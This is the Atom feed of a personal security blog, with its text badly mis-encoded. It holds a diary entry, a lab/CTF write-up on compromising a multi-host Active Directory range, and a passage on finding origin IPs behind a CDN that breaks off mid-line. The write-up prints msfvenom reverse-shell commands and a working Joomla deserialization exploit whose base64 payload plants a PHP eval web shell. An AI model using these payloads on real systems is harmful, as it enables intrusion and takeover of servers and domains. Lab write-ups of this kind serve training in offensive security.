<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Patrilic&#39;s blog</title>
  
  <subtitle>ä¸å¿˜åˆå¿ƒ</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://patrilic.top/"/>
  <updated>2020-01-05T13:56:43.363Z</updated>
  <id>http://patrilic.top/</id>
  
  <author>
    <name>Patrilic</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Tomorrow</title>
    <link href="http://patrilic.top/2099/12/31/Tomorrow/"/>
    <id>http://patrilic.top/2099/12/31/Tomorrow/</id>
    <published>2099-12-30T16:00:00.000Z</published>
    <updated>2020-01-05T13:56:43.363Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/wallpaper/thumb-1920-485164.jpg" alt></p><h5 id="å†™ç»™è‡ªå·±"><a href="#å†™ç»™è‡ªå·±" class="headerlink" title="å†™ç»™è‡ªå·±"></a>å†™ç»™è‡ªå·±</h5><hr><blockquote><p>Tomorrow is not just another day in your life<br>Itâ€™s the next day in an â€˜it does matterâ€™ life</p></blockquote><hr><p>å…¶å®å‘¢ï¼Œä¸€ç›´æƒ³æŠŠåšå®¢å˜æˆä¸€ä¸ªåªå±äºè‡ªå·±çš„å°å—ç©ºé—´ï¼Œè‡ªå·±æƒ³æ€ä¹ˆè£…é¥°å°±æ€ä¹ˆè£…é¥°ï¼Œæƒ³å†™ä»€ä¹ˆå°±å†™ä»€ä¹ˆï¼Œç”šè‡³ä¹‹å‰æœ‰æ®µæ—¶é—´åªç”¨<code>hexo s</code>233333</p><p>ç°åœ¨è§‰å¾—å‘¢ï¼Œè¿˜æ˜¯ä¸€æ ·ï¼Œä¸ç”¨åœ¨æ„åˆ«äººçš„çœ¼å…‰ï¼Œè‡ªå·±åšå¹²ä»€ä¹ˆå°±åšä»€ä¹ˆï¼Œæ…¢æ…¢æŠŠè‡ªå·±æƒ³å¥½å¥½å†™çš„ä¸œè¥¿æ”¾åœ¨åšå®¢ä¸Šï¼Œç­‰ä»¥åå¹´çºªä¸Šå»äº†ï¼Œä¹Ÿç®—æ˜¯æœ‰ä¸ªçºªå¿µï½</p><p>ä»¥åè¿™é‡Œæˆ‘æ‰“ç®—å†™ä¸€ç‚¹è‡ªå·±ä»ç”Ÿæ´»ä¸­ç»å†çš„äº‹æƒ…å¾—åˆ°çš„æ„Ÿæ‚Ÿæˆ–è€…ä¸€äº›æœ‰è¶£çš„äº‹æƒ…å§ï¼Œæœ¬èº«ä¹Ÿä¸æ˜¯æƒ³ææˆçº¯æŠ€æœ¯åšå®¢çš„ ğŸ˜</p><blockquote><pre><code>-- 2019.8.28 æ—© 3ç‚¹56åˆ†</code></pre></blockquote><h5 id="2019-8-28"><a href="#2019-8-28" class="headerlink" title="2019.8.28"></a>2019.8.28</h5><p>è¿˜æœ‰å‡ å¤©å°±è¦æ­£å¼è¿›å…¥å¤§ä¸‰çš„ç”Ÿæ´»äº†ï¼Œè¯¾è¿˜è¡Œï¼Œä¸»è¦æ˜¯æ„Ÿè§‰å¯èƒ½è¿™è¾ˆå­çš„å­¦ç”Ÿç”Ÿæ¶¯ä¹Ÿå¿«åˆ°å¤´äº†..</p><p>æœ€è¿‘ç»å†å¾ˆå¤šäº‹æƒ…ï¼Œä¹Ÿçœ‹å¼€äº†ï¼Œå¥½å¥½å­¦ä¹ ï¼Œå¥½å¥½ç”Ÿæ´»ã€‚</p><p>åŠè¯¸å›ï¼š èº«ä½“å¥åº·æ‰æ˜¯ç¬¬ä¸€ä½ ï¼Œå“ å…±å‹‰å§</p><p>æ˜å¤©åŠ æ²¹</p><blockquote><p>Just fxxking do it dig fucking deep and get it done</p></blockquote><h5 id="2019-8-30"><a href="#2019-8-30" class="headerlink" title="2019.8.30"></a>2019.8.30</h5><p>å¥½åƒä»Šå¤©è¦å¼€å­¦äº†ï¼Œæ—©ç‚¹ä¼‘æ¯å§ï½</p><blockquote><p>Get raw and get intense</p></blockquote><h5 id="2019-9-9"><a href="#2019-9-9" class="headerlink" title="2019.9.9"></a>2019.9.9</h5><p>å·®è·å•Š..å¤ªèœäº†ï¼Œè¿˜æœ‰ä»€ä¹ˆç†ç”±ä¸åŠªåŠ›çš„å—ï¼Ÿ</p><blockquote><p>å¾®å…‰</p></blockquote><h5 id="2019-9-15"><a href="#2019-9-15" class="headerlink" title="2019.9.15"></a>2019.9.15</h5><blockquote><p>ä¸€åˆ‡æœ‰ä¸ºæ³• å¦‚æ¢¦å¹»æ³¡å½±<br>å¦‚éœ²äº¦å¦‚ç”µ åº”ä½œå¦‚æ˜¯è§‚</p></blockquote><h5 id="2020-1-5"><a href="#2020-1-5" class="headerlink" title="2020.1.5"></a>2020.1.5</h5><p>UNCè·¯å¾„ä¸èƒ½è®¿é—®å¤–ç½‘æœåŠ¡å™¨çš„åŸå› : ç»è¿‡è·¯ç”±ä¸ä¸€å®šéƒ½å¼€æ”¾135,137,139,445</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;img src=&quot;/wallpaper/thumb-1920-485164.jpg&quot; alt&gt;&lt;/p&gt;
&lt;h5 id=&quot;å†™ç»™è‡ªå·±&quot;&gt;&lt;a href=&quot;#å†™ç»™è‡ªå·±&quot; class=&quot;headerlink&quot; title=&quot;å†™ç»™è‡ªå·±&quot;&gt;&lt;/a&gt;å†™ç»™è‡ªå·±&lt;/h5&gt;&lt;hr&gt;
&lt;blo
      
    
    </summary>
    
      <category term="Diary" scheme="http://patrilic.top/categories/Diary/"/>
    
    
  </entry>
  
  <entry>
    <title>iSoonLab.org Write-up</title>
    <link href="http://patrilic.top/2019/12/12/iSoonLab.org%20Write-up/"/>
    <id>http://patrilic.top/2019/12/12/iSoonLab.org Write-up/</id>
    <published>2019-12-12T06:32:22.000Z</published>
    <updated>2019-12-12T07:26:41.417Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>@Author: Patrilic<br>@Time: 2019-12-12 14:32:22<br><img src="/wallpaper/[30125]16347313.jpg" alt></p></blockquote><h2 id="é¢˜ç›®æ‹“æ‰‘"><a href="#é¢˜ç›®æ‹“æ‰‘" class="headerlink" title="é¢˜ç›®æ‹“æ‰‘"></a>é¢˜ç›®æ‹“æ‰‘</h2><p>Linux1 - solr: 192.168.21.12</p><p>Linux2 - joomla!: 192.168.21.20</p><p>Backup.sub.iSoonLab.org: 192.168.21.8</p><p>subdc.sub.iSoonLab.org: 192.168.21.4  /  10.153.69.50</p><p>DC.iSoonLab.org: 10.153.69.5</p><p><img src="/iSoonLab.org Write-up/image-20191201130447779.png" alt="image-20191201130447779"></p><h2 id="Linux1"><a href="#Linux1" class="headerlink" title="Linux1"></a>Linux1</h2><p>ç›®æ ‡:192.168.121.131</p><p><img src="/iSoonLab.org Write-up/image-20191130235112082.png" alt="image-20191130235112082"></p><p>å¼€æ”¾8983ç«¯å£ï¼Œæ‰“å¼€æ˜¯solræœªæˆæƒï¼Œ8.1.1ç‰ˆæœ¬ï¼Œè”æƒ³åˆ°å‰æ®µæ—¶é—´å¾ˆç«çš„Apache Solr RCE</p><p><a href="https://www.freebuf.com/vuls/218730.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/218730.html</a>    </p><p>æ ¹æ®ç½‘ä¸Šçš„exp</p><p><a href="http://192.168.121.131:8983/solr/admin/cores?wt=json&amp;indexInfo=false" target="_blank" rel="noopener">http://192.168.121.131:8983/solr/admin/cores?wt=json&amp;indexInfo=false</a></p><p><img src="/iSoonLab.org Write-up/image-20191130235337378.png" alt="image-20191130235337378"></p><p>å­˜åœ¨iSoon core</p><p><img src="/iSoonLab.org Write-up/image-20191130235734297.png" alt="image-20191130235734297"></p><p><img src="/iSoonLab.org Write-up/image-20191130235823000.png" alt="image-20191130235823000"></p><p>ç¡®å®æ²¡é—®é¢˜ï¼Œå¼¹ä¸ªshellåˆ°æœ¬æœºæ¥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=&lt;IP_Addr&gt; LPORT=&lt;Port_Num&gt; -f elf &gt; shell.elf</span><br></pre></td></tr></table></figure><p>å› ä¸ºsolrç”¨æˆ·æ²¡æœ‰/tmpç›®å½•å†™æƒé™ï¼Œ å¯ä»¥å‚è€ƒ@hayaå¤§æ‰‹å­çš„<a href="https://forum.90sec.com/t/topic/579" target="_blank" rel="noopener">https://forum.90sec.com/t/topic/579</a></p><p>ç”¨perlæ¥æ‰§è¡Œè„šæœ¬</p><p><img src="/iSoonLab.org Write-up/image-20191201002127259.png" alt="image-20191201002127259"></p><p>flagå°±åœ¨å½“å‰ç›®å½•</p><p><img src="/iSoonLab.org Write-up/image-20191201002513741.png" alt="image-20191201002513741"></p><p>å½“ç„¶ï¼Œä¹Ÿå¯ä»¥åœ¨/var/tmpé‡Œå†™æ–‡ä»¶ï½</p><h2 id="Linux2"><a href="#Linux2" class="headerlink" title="Linux2"></a>Linux2</h2><p>ç®€å•ä¾¦æŸ¥åï¼Œå‘ç°å­˜åœ¨192.168.21.0/24ç½‘æ®µ</p><p><img src="/iSoonLab.org Write-up/image-20191201002640156.png" alt="image-20191201002640156"></p><p>ä½¿ç”¨msfè‡ªå¸¦çš„sock4aä½œä»£ç†å³å¯ï¼ŒLinux1åªæ˜¯ç”¨æ¥æ’•æ¥æµé‡å£å­</p><p>ä»£ç†å†…ç½‘åï¼Œå‘ç°åŒç½‘æ®µå­˜åœ¨ä¸‰å°æœºå™¨</p><p>æ‰¾åˆ°Linux2 : 192.168.21.20ï¼Œ å¼€æ”¾HTTPç«¯å£</p><p><img src="/iSoonLab.org Write-up/image-20191201003644193.png" alt="image-20191201003644193"></p><p>joomla-3.4.6ç‰ˆæœ¬ï¼Œå­˜åœ¨RCEï¼Œé€šè¿‡æ„é€ expï¼Œæ‹¿åˆ°webshell</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">JSimplepieFactory</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">JDatabaseDriverMysql</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">JDatabaseDriverMysqli</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $xx;</span><br><span class="line">    <span class="keyword">protected</span> $connection;</span><br><span class="line">    <span class="keyword">protected</span> $disconnectHandlers;</span><br><span class="line">    <span class="keyword">protected</span> $obj;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;xx = <span class="keyword">new</span> JSimplepieFactory();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;connection = <span class="number">1</span>;</span><br><span class="line">        $obj = <span class="keyword">new</span> SimplePie;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;disconnectHandlers = [</span><br><span class="line">            [$obj, <span class="string">"init"</span>],</span><br><span class="line">        ];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SimplePie</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $sanitize;</span><br><span class="line">    <span class="keyword">var</span> $cache_name_function;</span><br><span class="line">    <span class="keyword">var</span> $feed_url;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;feed_url = <span class="string">"system('echo \'ZWNobyAiPD9waHAgZXZhbChcJF9QT1NUW2FdKT8+IiA+IC9ob21lL3d3d3Jvb3QvZGVmYXVsdC8xLnBocA==\'| base64 -d | bash');JFactory::getConfig();exit;"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;cache_name_function = <span class="string">"assert"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;sanitize = <span class="keyword">new</span> JDatabaseDriverMysql();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> JDatabaseDriverMysqli();</span><br><span class="line">$ser = serialize($a);</span><br><span class="line"><span class="keyword">echo</span> $data = str_replace(chr(<span class="number">0</span>) . <span class="string">'*'</span> . chr(<span class="number">0</span>), <span class="string">'\0\0\0'</span>, $ser);</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ç”¨æˆ·åï¼š</span><br><span class="line">\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span></span><br><span class="line"></span><br><span class="line">å¯†ç ï¼š</span><br><span class="line">MYP<span class="string">";s:2:"</span>HS<span class="string">";O:21:"</span>JDatabaseDriverMysqli<span class="string">":4:&#123;s:5:"</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>xx<span class="string">";O:17:"</span>JSimplepieFactory<span class="string">":0:&#123;&#125;s:13:"</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>connection<span class="string">";i:1;s:21:"</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>disconnectHandlers<span class="string">";a:1:&#123;i:0;a:2:&#123;i:0;O:9:"</span>SimplePie<span class="string">":3:&#123;s:8:"</span>sanitize<span class="string">";O:20:"</span>JDatabaseDriverMysql<span class="string">":0:&#123;&#125;s:19:"</span>cache_name_function<span class="string">";s:6:"</span>assert<span class="string">";s:8:"</span>feed_url<span class="string">";s:149:"</span>system(<span class="string">'echo \'ZWNobyAiPD9waHAgZXZhbChcJF9QT1NUW2FdKT8+IiA+IC9ob21lL3d3d3Jvb3QvZGVmYXVsdC8xLnBocA==\'| base64 -d | bash'</span>);JFactory::getConfig();<span class="keyword">exit</span>;<span class="string">";&#125;i:1;s:4:"</span>init<span class="string">";&#125;&#125;s:6:"</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>obj<span class="string">";N;&#125;</span></span><br></pre></td></tr></table></figure><p>antswordè¿æ¥åï¼Œåœ¨/tmpç›®å½•ä¸Šä¼ æˆ‘ä»¬ç”Ÿæˆçš„msfæœ¨é©¬</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.21.12 LPORT=6666 -f elf &gt; shell2.elf</span><br></pre></td></tr></table></figure><p><img src="/iSoonLab.org Write-up/image-20191201004320825.png" alt="image-20191201004320825"></p><p>æ‹¿åˆ°shellåï¼ŒæŸ¥çœ‹uname</p><p><img src="/iSoonLab.org Write-up/image-20191201004824374.png" alt="image-20191201004824374"></p><p>å†…æ ¸ç‰ˆæœ¬æ¯”è¾ƒä½çš„æ¡Œé¢ç‰ˆæœ¬ï¼Œå­˜åœ¨CVE-2019-13272</p><p>EXPéœ€è¦æ»¡è¶³ä¸‰ä¸ªæ¡ä»¶: </p><ol><li>å†…æ ¸ç‰ˆæœ¬ &lt; 5.1.17 ä¸”ä¸ºæ¡Œé¢ç‰ˆ</li><li>å­˜åœ¨/home/\<user></user></li><li>äº¤äº’å¼shell</li></ol><p><img src="/iSoonLab.org Write-up/image-20191201005023629.png" alt="image-20191201005023629"></p><p>æˆåŠŸæ‹¿åˆ°ç¬¬äºŒä¸ªflag</p><h2 id="Backup-sub-iSoonLab-org"><a href="#Backup-sub-iSoonLab-org" class="headerlink" title="Backup.sub.iSoonLab.org"></a>Backup.sub.iSoonLab.org</h2><p>å›è¿‡æ¥çœ‹webç•Œé¢çš„æç¤º</p><p><img src="/iSoonLab.org Write-up/image-20191201005203360.png" alt="image-20191201005203360"></p><p>æ”¾å‡ºäº†ä¸‹ä¸€æ­¥çš„hintï¼ŒæŸ¥çœ‹å·²ç»å®‰è£…çš„è½¯ä»¶å’Œpythonç¬¬ä¸‰æ–¹åº“</p><p><img src="/iSoonLab.org Write-up/image-20191201005355412.png" alt="image-20191201005355412"></p><p>ä¸‰æ¡æ€è·¯ï¼š</p><ol><li><p>åˆ©ç”¨impacketå’Œarpspoofè¿›è¡Œä¸­é—´äººæ”»å‡»</p></li><li><p>åœ¨æœ¬æœºä¸Šè¿›è¡Œä¿¡æ¯æœé›†ï¼Œå¯»æ‰¾åˆ°åŸŸæˆå‘˜æœºå™¨çš„è·¯å­</p></li><li>ç³»ç»Ÿæ¼æ´ -&gt; ms17010 .etc </li></ol><ol><li><p>ä¸­é—´äººæ”»å‡»ä½¿ç”¨ms15-014 å’Œ ms15-011 è¿›è¡Œç»„ç­–ç•¥åŠ«æŒï¼Œæ‹¿ä¸‹åŸŸæˆå‘˜æœºå™¨</p></li><li><p>ç¿»æœºå™¨çš„æ—¥å¿—</p></li><li>æœ‰dayä¸Šdayï½ </li></ol><p>### </p><p>ç®€å•æ–¹æ³•:</p><p>é€šè¿‡<code>.bash_history</code>æ‹¿åˆ°mountå‘½ä»¤ï¼Œå­˜æœ‰æ˜æ–‡å¯†ç ï¼Œ é€šè¿‡<code>exploit/windows/smb/psexec</code>å³å¯æ‹¿åˆ°ç›®æ ‡æœºå™¨NT/SYSTEM</p><p><img src="/iSoonLab.org Write-up/image-20191201013130568.png" alt="image-20191201013130568"></p><p>ä¸­é—´äººæµ‹è¯•ä¹Ÿæ˜¯å¯è¡Œçš„ï¼Œä½¿ç”¨MS15-011åŠ«æŒç»„ç­–ç•¥ï¼Œåªæ˜¯éœ€è¦ç­‰å¾…ç»„ç­–ç•¥ç”Ÿæ•ˆ (é»˜è®¤90åˆ†é’Ÿ)</p><p>&lt;æ‡’ç‹—ä¸æƒ³æˆªå›¾äº†&gt;</p><h2 id="subdc-iSoonLab-org"><a href="#subdc-iSoonLab-org" class="headerlink" title="subdc.iSoonLab.org"></a>subdc.iSoonLab.org</h2><p>åœ¨backupæœºå­ä¸Šçš„C:\Backupç¿»åˆ°äº†æ³¨å†Œè¡¨çš„å­˜æ¡£</p><p><img src="/iSoonLab.org Write-up/image-20191201014315000.png" alt="image-20191201014315000"></p><p>ä¸‹è½½ä¸‹æ¥ä½¿ç”¨secretsdumpè¿›è¡Œdump</p><p><img src="/iSoonLab.org Write-up/image-20191201014547133.png" alt="image-20191201014547133"></p><p>æ‹¿åˆ°æœåŠ¡è´¦æˆ·åï¼Œç”¨æ¥æ„é€ ç™½é“¶ç¥¨æ®ï¼Œæ”»å‡»subdc.sub.iSoonLab.org<br>ï¼ˆMS14068ä¹Ÿå¯ï¼‰</p><p><img src="/iSoonLab.org Write-up/image-20191201015913467.png" alt="image-20191201015913467"></p><p>(æ³¨æ„å¿…é¡»å…³é—­Linux2ä¸­çš„arpspoof)</p><p><img src="/iSoonLab.org Write-up/image-20191201020209077.png" alt="image-20191201020209077"></p><p>ç¬¬å››ä¸ªflagåˆ°æ‰‹ï½ï½</p><h2 id="DC-iSoonLab-org"><a href="#DC-iSoonLab-org" class="headerlink" title="DC.iSoonLab.org"></a>DC.iSoonLab.org</h2><p>æœ€åå°±å¾ˆç®€å•å•¦ï¼Œå­çˆ¶åŸŸä¸­å¸¸è§çš„åŒå‘ä¿¡ä»»ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡æ„é€ ä¿¡ä»»ç¥¨æ®æ¥è¿›è¡Œæ”»å‡»</p><p>åˆ©ç”¨ä¿¡ä»»ç¥¨æ® </p><p><a href="http://www.harmj0y.net/blog/redteaming/the-trustpocalypse/" target="_blank" rel="noopener">http://www.harmj0y.net/blog/redteaming/the-trustpocalypse/</a> </p><p>è¿™é‡Œæœ‰ä¸€ç‚¹å°é—®é¢˜: å½“æŒ‡å®škrbtgtè´¦æˆ·æ—¶ï¼Œå› ä¸ºå­çˆ¶åŸŸä¸­å­˜åœ¨ä¸¤ä¸ªkrbtgtè´¦æˆ·ï¼ŒDCsyncè½¬å‚¨æ—¶å¯èƒ½çˆ†<code>NOT_UNIQUE</code>ï¼Œå¯ä»¥ä½¿ç”¨/allè§£å†³ </p><p>åˆ©ç”¨dcsync è½¬å‚¨å­åŸŸçš„æ‰€æœ‰hash </p><p><img src="/iSoonLab.org Write-up/4624EF12-0825-4134-BFFE-AF47CF9CA4FB.png" alt="4624EF12-0825-4134-BFFE-AF47CF9CA4FB"></p><p><img src="/iSoonLab.org Write-up/04C766D7-B915-48FE-A381-3CA4DD18727D.png" alt="04C766D7-B915-48FE-A381-3CA4DD18727D"></p><p>ä½¿ç”¨/Ptt è¿›è¡Œä¿¡ä»»ç¥¨æ®ä¼ é€’å³å¯</p><p><img src="/iSoonLab.org Write-up/2A7C786C-5AA4-4AE2-8DE1-755DBFDE9382.png" alt="2A7C786C-5AA4-4AE2-8DE1-755DBFDE9382"></p><p>æ‹¿åˆ°åŸŸæ§æƒé™ï¼Œflagåœ¨C:\Users\Administraotr\flag.txtä¸­</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;@Author: Patrilic&lt;br&gt;@Time: 2019-12-12 14:32:22&lt;br&gt;&lt;img src=&quot;/wallpaper/[30125]16347313.jpg&quot; alt&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;
      
    
    </summary>
    
      <category term="Write-up" scheme="http://patrilic.top/categories/Write-up/"/>
    
    
      <category term="iSoonLab.org" scheme="http://patrilic.top/tags/iSoonLab-org/"/>
    
  </entry>
  
  <entry>
    <title>Bypass CDN å¯»æ‰¾çœŸå®IP</title>
    <link href="http://patrilic.top/2019/10/09/Bypass%20CDN%20%E5%AF%BB%E6%89%BE%E7%9C%9F%E5%AE%9EIP_1/"/>
    <id>http://patrilic.top/2019/10/09/Bypass CDN å¯»æ‰¾çœŸå®IP_1/</id>
    <published>2019-10-09T05:12:49.000Z</published>
    <updated>2019-10-31T15:51:16.775Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>@Author: Patrilic<br>@Time: 2019-10-09 13:12:49<br><img src="/wallpaper/futuristic.jpeg" alt></p></blockquote><h2 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h2><p>ä¸ªäººè§‰å¾—ï¼Œç»•è¿‡CDNå»å¯»æ‰¾ä¸»æœºçš„çœŸå®ipï¼Œæ›´å®¹æ˜“èƒ½å¯»æ‰¾åˆ°ä¼ä¸šç½‘ç»œçš„è–„å¼±åœ°å¸¦ï¼Œæ‰€ä»¥Bypass CDNä¹Ÿå°±å˜æˆäº†è‡³å…³é‡è¦çš„ä¸€ç‚¹</p><h2 id="0x01-å¸¸è§Bypassæ–¹æ³•"><a href="#0x01-å¸¸è§Bypassæ–¹æ³•" class="headerlink" title="0x01 å¸¸è§Bypassæ–¹æ³•"></a>0x01 å¸¸è§Bypassæ–¹æ³•</h2><h3 id="å­åŸŸåæœé›†"><a href="#å­åŸŸåæœé›†" class="headerlink" title="å­åŸŸåæœé›†"></a>å­åŸŸåæœé›†</h3><p>ç”±äºæˆæœ¬é—®é¢˜ï¼Œå¯èƒ½æŸäº›å‚å•†å¹¶ä¸ä¼šå°†æ‰€æœ‰çš„å­åŸŸåéƒ½éƒ¨ç½²CDNï¼Œæ‰€ä»¥å¦‚æœæˆ‘ä»¬èƒ½å°½é‡çš„æœé›†å­åŸŸåï¼Œæˆ–è®¸å¯ä»¥æ‰¾åˆ°ä¸€äº›æ²¡æœ‰éƒ¨ç½²CDNçš„å­åŸŸåï¼Œæ‹¿åˆ°æŸäº›æœåŠ¡å™¨çš„çœŸå®ip/æ®µ</p><p>ç„¶åå…³äºå­åŸŸåæœé›†çš„æ–¹å¼å¾ˆå¤šï¼Œå°±ä¸ä¸€ä¸€ä»‹ç»äº†ï¼Œæˆ‘å¹³æ—¶ä¸»è¦æ˜¯ä»è¿™å‡ ä¸ªæ–¹é¢æœé›†å­åŸŸåï¼š</p><ol><li>SSLè¯ä¹¦</li><li>çˆ†ç ´</li><li>Google Hacking</li><li>åŒé‚®ç®±æ³¨å†Œäºº</li><li>DNS åŸŸä¼ é€</li><li>é¡µé¢JSæœé›†</li><li>ç½‘ç»œç©ºé—´å¼•æ“</li></ol><p>å·¥å…·ä¹Ÿæœ‰å¾ˆå¤šå‰å®³çš„ï¼Œå¹³æ—¶æˆ‘ä¸€èˆ¬ä½¿ç”¨ OneForALL + ESD + JSfinder æ¥è¿›è¡Œæœé›†</p><p>ï¼ˆESDå¯ä»¥åŠ è½½layerçš„å­—å…¸ï¼Œå¾ˆå¥½ç”¨ï¼‰</p><h3 id="æŸ¥è¯¢DNSå†å²è§£æè®°å½•"><a href="#æŸ¥è¯¢DNSå†å²è§£æè®°å½•" class="headerlink" title="æŸ¥è¯¢DNSå†å²è§£æè®°å½•"></a>æŸ¥è¯¢DNSå†å²è§£æè®°å½•</h3><p>å¸¸å¸¸æœåŠ¡å™¨åœ¨è§£æåˆ°CDNæœåŠ¡å‰ï¼Œä¼šè§£æçœŸå®ipï¼Œå¦‚æœå†å²æœªåˆ é™¤ï¼Œå°±å¯èƒ½æ‰¾åˆ°<br><img src="/Bypass CDN å¯»æ‰¾çœŸå®IP.resources/9E7A020F-400D-4098-95A0-890D6ECF58B5.png" alt="aa49a0dae035183756bc9b7c574f7d1d"><br>å¸¸ç”¨ç½‘ç«™ï¼š<br><a href="http://viewdns.info/" target="_blank" rel="noopener">http://viewdns.info/</a><br><a href="https://x.threatbook.cn/" target="_blank" rel="noopener">https://x.threatbook.cn/</a><br><a href="http://www.17ce.com/" target="_blank" rel="noopener">http://www.17ce.com/</a><br><a href="https://dnsdb.io/zh-cn/" target="_blank" rel="noopener">https://dnsdb.io/zh-cn/</a><br><a href="https://securitytrails.com/" target="_blank" rel="noopener">https://securitytrails.com/</a><br><a href="http://www.ip138.com/" target="_blank" rel="noopener">http://www.ip138.com/</a><br><a href="https://github.com/vincentcox/bypass-firewalls-by-DNS-history" target="_blank" rel="noopener">https://github.com/vincentcox/bypass-firewalls-by-DNS-history</a></p><h3 id="MXè®°å½•ï¼ˆé‚®ä»¶æ¢æµ‹ï¼‰"><a href="#MXè®°å½•ï¼ˆé‚®ä»¶æ¢æµ‹ï¼‰" class="headerlink" title="MXè®°å½•ï¼ˆé‚®ä»¶æ¢æµ‹ï¼‰"></a>MXè®°å½•ï¼ˆé‚®ä»¶æ¢æµ‹ï¼‰</h3><p>è¿™ä¸ªå¾ˆç®€å•ï¼Œå¦‚æœç›®æ ‡ç³»ç»Ÿæœ‰å‘ä»¶åŠŸèƒ½ï¼Œé€šå¸¸åœ¨æ³¨å†Œç”¨æˆ·/æ‰¾å›å¯†ç ç­‰åœ°æ–¹<img src="/Bypass CDN å¯»æ‰¾çœŸå®IP.resources/30801098-D5BB-4C46-83CB-DF4313C5D54E.png" alt="8aa01bd3ebc5fea8c50bfcf182df44d7"></p><h3 id="SSLè¯ä¹¦æ¢æµ‹"><a href="#SSLè¯ä¹¦æ¢æµ‹" class="headerlink" title="SSLè¯ä¹¦æ¢æµ‹"></a>SSLè¯ä¹¦æ¢æµ‹</h3><p>æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ç©ºé—´å¼•æ“è¿›è¡ŒSSLè¯ä¹¦æ¢æµ‹</p><blockquote><p>443.https.tls.certificate.parsed.extensions.subject_alt_name.dns_names:<a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a></p></blockquote><p><img src="/Bypass CDN å¯»æ‰¾çœŸå®IP.resources/FA2E7635-76E4-43A3-B724-C782E3C08304.png" alt="cbd4dfce974be17192c5d3991bcb9ceb"><br>443.https.tls.certificate.parsed.extensions.subject_alt_name.dns_names:<a href="http://www.baidu.com" target="_blank" 